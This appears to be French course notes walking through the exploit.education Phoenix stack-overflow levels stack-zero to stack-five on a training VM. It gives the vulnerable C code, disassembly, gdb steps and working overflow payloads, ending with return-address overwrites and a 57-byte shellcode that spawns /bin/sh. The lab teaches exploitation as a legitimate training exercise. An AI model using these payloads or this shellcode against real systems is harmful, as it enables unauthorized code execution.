---
title: Your Page Title 
index: true
---

# Tape3

## Mise en route
- Télécharger la vm amd64 [ici](https://exploit.education/downloads/), qemu aussi si vous ne l'avez pas, [debian](https://www.tecmint.com/install-qemu-kvm-ubuntu-create-virtual-machines/), [arch](https://www.howtoforge.com/how-to-install-kvm-qemu-on-manjaro-archlinux/]).
- Pour nix-os utilisez une nix shell `nix-shell -p qemu".
- Lancez le script `boot-exploit-education-phoenix-amd64.sh`.
- Utilisez le login `user` et le mot de passe `user`.
- Faite `ssh -p2222 user@localhost` dans un autre **terminal** pour avoir une meilleure expérience.
- Vous trouverez les fichiers exécutables dans `/opt/phoenix/amd64/`.

## Notes importantes
- `volatile` est pour forcer le compilateur à ne pas optimiser la variable, et de toujours la mettre à jour en mémoire.
- `"\x"` permet d'écrire des chaines de caractères en utilisant des hexadicimaux: `"\x30\x30" == "00"`.
- Une variable en bash ne peut pas stocker le caractère `'\x00'` (Stack-Five et Stack-Six).

### Rappels gdb
- La VM utilise **gef** (gdb enhanced features) pour faciliter l'utilisation de gdb.
- `start` est l'équivalent de `run` avec un breakpoint sur `main()`. Vu que le binaire ne contient pas assez de symboles pour le débugage, on ne peut faire des breakpoints que sur des adresses.
  - gef permet d'utiliser une syntaxe plus simple avec le nom de la fonction, ex: `b *start_level`.
  - Ne pas oublier l'astérisque avant l'adresse pour les breakpoints!!
- Pour donner un input au programme sur gdb on utilise la syntaxe `start< <(echo -ne "Hello")`, on peut utiliser `run` à la place pour ne pas s'arrêter au `main()`.
- On peut avoir l'assembleur d'une fonction en utilisant la commande `disassemble`, exemple: `disassemble start_level` donnera le code assembleur de la fonction `start_level`. C'est plus pratique sur la VM vu que `objdump --disassemble=start_level` n'est pas supporté par cette dernière.

## Stack-zero

- Le code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```

- Le fait de déclarer `buffer` et `changeme` dans une struct, permet d'être sûr que les 64 caractères de `buffer` précèderont l'entier `changeme`.
- Ajoutant à cela le fait que l'implémentation `gets` simpliste permet d'écrire autant d'octets qu'on veut (segfault si elle arrive à une adresse interdite).
- Ainsi, en écrivant plus de 64 octets, on va modifier la valeur de `changeme`.

```sh
user@phoenix-amd64:~$ python -c 'print("E"*64+"\x10\x20\x30\40")' | /opt/phoenix/amd64/stack-zero 
```
```
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
Well done, the 'changeme' variable has been changed!
```

<center><div class="figure-container-small">
<figure class="figure"> 
<img src="./_static/images/phoenix/stack-zero.png"/>
</figure>
<figcaption>Disposition de la structure en mémoire.</figcaption>
</div></center>

> Remarquez que la valeur de **changme** est inversée, vu qu'on écrit depuis l'adresse basse à l'adresse haute, et que l'architecture amd64 suit le schéma **little-endian**.

## Stack-one

- Le code:

```c

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  if (argc < 2) {
    errx(1, "specify an argument, to be copied into the \"buffer\"");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, argv[1]);

  if (locals.changeme == 0x496c5962) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Getting closer! changeme is currently 0x%08x, we want 0x496c5962\n",
        locals.changeme);
  }

  exit(0);
}
```

- On a toujours la même struct, mais ici on doit passer l'argument `argv[1]` et faire en sorte d'avoir une valeur spécifique pour `changeme`.
  - La fonction `strcpy` est tout aussi naïve que `gets`, elle ne s'arrête qu'au caractère `0x00` contrairement à `strncpy` qui accepte un troisième argument représentant le nombre de caractères à copier.

```sh
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-one $( python -c 'print("E"*64+"\x62\x59\x6c\x49")')
```
```
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack-Two

- Le code:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  char *ptr;

  printf("%s\n", BANNER);

  ptr = getenv("ExploitEducation");
  if (ptr == NULL) {
    errx(1, "please set the ExploitEducation environment variable");
  }

  locals.changeme = 0;
  strcpy(locals.buffer, ptr);

  if (locals.changeme == 0x0d0a090a) {
    puts("Well done, you have successfully set changeme to the correct value");
  } else {
    printf("Almost! changeme is currently 0x%08x, we want 0x0d0a090a\n",
        locals.changeme);
  }

  exit(0);
}
```

- Même idée que stack-one, on a juste à exporter la variable d'environnement `ExploitEducation` avec la chaine de caractères nécessaire.

```sh
user@phoenix-amd64:~$ export ExploitEducation=$( python -c 'print("E"*64+"\x0a\x09\x0a\x0d")')  
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-two 
```

```
Welcome to phoenix/stack-two, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

## Stack-Three

- Le code:
  
```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int (*fp)();
  } locals;

  printf("%s\n", BANNER);

  locals.fp = NULL;
  gets(locals.buffer);

  if (locals.fp) {
    printf("calling function pointer @ %p\n", locals.fp);
    fflush(stdout);
    locals.fp();
  } else {
    printf("function pointer remains unmodified :~( better luck next time!\n");
  }

  exit(0);
}
```

- C'est toujours la même histoire, mais ici, on doit écrire **8 octets** correspondant à l'adresse de la fonction `complete_level()`.

```sh
user@phoenix-amd64:~$ nm /opt/phoenix/amd64/stack-three
...
000000000040069d T complete_level
...
```
```sh
user@phoenix-amd64:~$ python -c 'print("E"*64+"\x9d\x06\x40\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/stack-three
```
```
Welcome to phoenix/stack-three, brought to you by https://exploit.education
calling function pointer @ 0x40069d
Congratulations, you've finished phoenix/stack-three :-) Well done!
```

## Stack-Four

- Le code:

```c
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void complete_level() {
  printf("Congratulations, you've finished " LEVELNAME " :-) Well done!\n");
  exit(0);
}

void start_level() {
  char buffer[64];
  void *ret;

  gets(buffer);

  ret = __builtin_return_address(0);
  printf("and will be returning to %p\n", ret);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

- On n'a plus la struct, autrement dit le compilateur peut choisir l'ordre qui lui va.
- Maintenant, on doit réécrire l'adresse de retour `push` par l'instruction `call start_level()` pour **retourner** vers `complete_level()` au lieu de `main()`.
- Sachant que la pile doit être alignée sur 16 et que le compilateur peut sauvegarder des registres dans la pile, on ne peut pas calculer directement le nombre d'octets nécessaires sans voir le code assembleur.

```sh
user@phoenix-amd64:~$ objdump --disassemble /opt/phoenix/amd64/stack-four 
```
```
0000000000400635 <start_level>:
  400635:	55                   	push   %rbp
  400636:	48 89 e5             	mov    %rsp,%rbp
  400639:	48 83 ec 50          	sub    $0x50,%rsp 
  40063d:	48 8d 45 b0          	lea    -0x50(%rbp),%rax
  400641:	48 89 c7             	mov    %rax,%rdi
  400644:	e8 27 fe ff ff       	callq  400470 <gets@plt>
  400649:	48 8b 45 08          	mov    0x8(%rbp),%rax
  40064d:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
  400651:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400655:	48 89 c6             	mov    %rax,%rsi
  400658:	bf 33 07 40 00       	mov    $0x400733,%edi
  40065d:	b8 00 00 00 00       	mov    $0x0,%eax
  400662:	e8 f9 fd ff ff       	callq  400460 <printf@plt>
  400667:	90                   	nop
  400668:	c9                   	leaveq 
  400669:	c3                   	retq   
```

- On voit que `%rbp` fut push dans la pile.
- L'instruction `sub` nous dit que **0x50=80** octets furent alloués. Et la préparation de l'appel à `gets(buffer);` nous permet de savoir que notre buffer commence au sommet de la pile (l'adresse la plus basse).
- Pour ainsi dire, on doit écrire **80+8** octets avant d'arriver à l'adresse de retour.

```sh
user@phoenix-amd64:~$ nm /opt/phoenix/amd64/stack-four  
...
000000000040061d T complete_level
...
```
```sh
user@phoenix-amd64:~$ python -c 'print("E"*88+"\x1d\x06\x40\x00\x00\x00\x00\x00")' | /opt/phoenix/amd64/stack-four 
```
```
Welcome to phoenix/stack-four, brought to you by https://exploit.education
and will be returning to 0x40061d
Congratulations, you've finished phoenix/stack-four :-) Well done!
```

> Il faut que vous sachiez que ce n'est pas toutes les architectures CPU qui enregistrent l'adresse de retour dans la pile. Souvent il existe ce qu'on appelle le [link register](https://en.wikipedia.org/wiki/Link_register) qui se charge de garder l'adresse de retour au lieu de faire des accès mémoires !

## Stack-Five

- Le code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

void start_level() {
  char buffer[128];
  gets(buffer);
}

int main(int argc, char **argv) {
  printf("%s\n", BANNER);
  start_level();
}
```

- Alors, ici, on doit toujours réécrire l'adresse de retour enregistrée dans la pile. En revanche, on doit rediriger l'exécution vers du code qu'on charge dans le buffer. 
- Pour cela, on doit connaitre l'adresse exacte où est situé notre buffer en passant par **gdb**. Mais avant, on peut préparer le terrain en utilisant `objdump`.

```sh
user@phoenix-amd64:~$ objdump --disassemble /opt/phoenix/amd64/stack-five 
```

```
000000000040058d <start_level>:
  40058d:	55                   	push   %rbp
  40058e:	48 89 e5             	mov    %rsp,%rbp
  400591:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp
  400595:	48 8d 45 80          	lea    -0x80(%rbp),%rax
  400599:	48 89 c7             	mov    %rax,%rdi
  40059c:	e8 4f fe ff ff       	callq  4003f0 <gets@plt>
  4005a1:	90                   	nop
  4005a2:	c9                   	leaveq 
  4005a3:	c3                   	retq   
```
- Alors, l'instruction `add    $0xffffffffffffff80,%rsp` est équivalente à `sub $0x80, %rsp`, autrement dit, on alloue 128 octets (la taille du buffer). Et l'appel à `gets()` nous confirme que le buffer commence bel et bien à `%rsp == %rbp - 0x80`. Avec cela, on peut calculer le nombre d'octets nécessaires pour arriver à l'adresse de retour.
  - 128 octets + 8 octets du rbp sauvegardé = 136 octets avant l'adresse de retour.

> Vous pouvez aussi inspecter la mémoire quand gdb est dans `start_level` pour voir où se trouve l'adresse de l'instruction juste après `call start_level` dans `main()` et calculer la différence entre elle et l'adresse du buffer.

- Le gdb de la VM n'aime pas avoir du python comme entrée, du coup je crée une variable d'environnement qui stockera un shellcode de **57 octets** et **79 'E'**, vu que l'adresse du buffer contiendra des zéros, on la passera directement via un `echo -ne` ou un `printf`.

```sh
export fill=$(printf "\x48\x31\xc0\x50\x5f\xb0\x03\x0f\x05\x50\x48\xbf\x2f\x64\x65\x76\x2f\x74\x74\x79\x57\x54\x5f\x50\x5e\x66\xbe\x02\x27\xb0\x02\x0f\x05\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x50\x57\x54\x5e\x48\x99\xb0\x3b\x0f\x05"$(python3 -c 'print("E"*79)'))
```

- Les variables d'environnement sont chargées en mémoire au-dessus de la pile, une modification de ces dernières décalera le début de la pile, et changera l'adresse où commence le buffer.
- En lançant **gdb** faites toujours en sorte d'exécuter ses instructions avant `run` ou `start`, pour avoir le même début de pile que si on exécute le code via le terminal:

```sh
    user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five
    (gdb) unset env LINES
    (gdb) unset env COLUMNS
    (gdb) set env _=/opt/phoenix/amd64/stack-five
    (gdb) b *start_level+20 # c'est l'adresse de l'instruction nop dans start_level (4005a1)
    (gdb) run < <(printf $fill"\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF") # juste pour tester
```

> On utilise `<()` pour la substitution de processus et non `$()`, afin de conserver les caractères spéciaux. Sachez qu'avec `$()`, le shell interprète la sortie du sous-processus comme une chaîne de caractères, ce qui peut entraîner la perte de caractères nuls `\x00` et d'autres caractères spéciaux. Avec `<()`, on crée un fichier temporaire qui conserve tous les caractères dans leur forme brute, y compris les caractères nuls et autres caractères spéciaux (référence : [GNU](https://www.gnu.org/software/bash/manual/bash.html#Process-Substitution)).

- Et là, on retient l'adresse de `%rsp`:`0x00007fffffffe450` (elle est sûrement différente chez vous !!). On peut faire deux `stepi` pour arriver à `ret`, là on remarque que la valeur pointée par `%rsp`=`0xffffffffffffffff`, et que gdb affiche `Cannot disassemble from $PC` vu que l'adresse de retour pointe vers de l'espace kernel.

- En relançant gdb en écrivant la bonne adresse du buffer à la place de l'adresse de retour, on obtient:

```sh
(gdb) unset env LINES
(gdb) unset env COLUMNS
(gdb) set env _=/opt/phoenix/amd64/stack-five
(gdb) run < <(printf $fill"\x50\xe4\xff\xff\xff\x7f\x00\x00")

Starting program: /opt/phoenix/amd64/stack-five < <(printf $fill"\x50\xe4\xff\xff\xff\x7f\x00\x00")
Welcome to phoenix/stack-five, brought to you by https://exploit.education
process 428 is executing new program: /bin/dash
warning: Could not load shared library symbols for linux-vdso.so.1.
Do you need "set solib-search-path" or "set sysroot"?

$ # shell started
```

- Quand vous lancerez le programme depuis le terminal, utilisez le chemin absolu pour avoir la même valeur pour la variable `_` que ce qu'on a mis sur gdb.

```sh
user@phoenix-amd64:~$ echo -ne "$fill\x50\xe4\xff\xff\xff\x7f\x00\x00" | /opt/phoenix/amd64/stack-five 
$ # shell started
```

> Si ca ne marche pas avec `start` alors que le shellcode est bel et bien exécuté, essayez avec `run` et en utilisant un fichier au lieu d'une commande bash:
> ```sh
> user@phoenix-amd64:~$ echo -ne "$fill\x50\xe4\xff\xff\xff\x7f\x00\x00" > input-stack-five.txt
> user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-five
> (gdb) unset env LINES
> (gdb) unset env COLUMNS
> (gdb) set env _=/opt/phoenix/amd64/stack-five
> (gdb) start < ./input-stack-five.txt
> ```